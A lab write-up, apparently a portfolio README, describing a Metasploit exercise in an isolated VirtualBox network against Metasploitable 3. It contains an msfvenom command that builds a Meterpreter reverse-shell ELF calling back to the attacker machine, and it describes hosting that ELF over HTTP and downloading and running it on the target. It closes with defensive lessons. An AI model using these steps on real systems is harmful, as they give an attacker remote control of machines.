# Metasploit-RCE-and-C2-Reverse-Shell-Deployment

# Project Overview
This lab demonstrates the end-to-end process of exploiting a remote target using the Metasploit Framework. I successfully generated a custom payload, established a delivery mechanism via a local web server, and captured a Meterpreter reverse shell to perform post-exploitation reconnaissance on a Linux target.

# Environments & Tools
* Virtualization Platform: Oracle VirtualBox 
* Attacker OS: Kali Linux 2024.4 
* Target OS: Metasploitable 3 (Linux-based) 
* Tools: Metasploit Framework (msfconsole), msfvenom, Python3

# Technical Methodology
<h2> 1. Networking & Connectivity</h2>

Before exploitation, I configured a NAT Network to ensure isolated communication between the two virtual machines. Connectivity was verified using the ping command to ensure the target (10.0.2.4) was reachable from the attacker machine.

<h2>2. Payload Weaponization</h2>

I utilized msfvenom to craft a specialized payload:
* Command: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f elf > payload.elf 
* Logic: This creates an Executable and Linkable Format (ELF) file that, when run, initiates a connection back to my Kali machine.

<h2>3. Delivery & Listener Setup</h2>

* Delivery: I used Python’s built-in HTTP module (python3 -m http.server 8080) to host the payload, simulating a drive-by download or file-transfer scenario.
* Listener: In msfconsole, I configured the exploit/multi/handler to listen for the incoming reverse connection from the target machine.

<h2>4. Exploitation & Remote Access</h2>

On the target machine, the payload was downloaded via wget, granted execution permissions (chmod +x), and executed.

# Post-Exploitation Findings

Upon execution, a Meterpreter session was successfully opened. I performed initial system reconnaissance by running the ifconfig command through the encrypted tunnel, proving full remote access to the target's network interface details.

# Key Security Takeaways

Ingress Filtering: This lab highlights the danger of allowing internal machines to download files via unauthorized ports (like 8080).


Least Privilege: Executing the payload required permission changes, emphasizing the importance of restricting chmod and execution rights for standard users.


Efficacy of Reverse Shells: Because the target connects out to the attacker, this method is highly effective at bypassing simple inbound firewall rules.
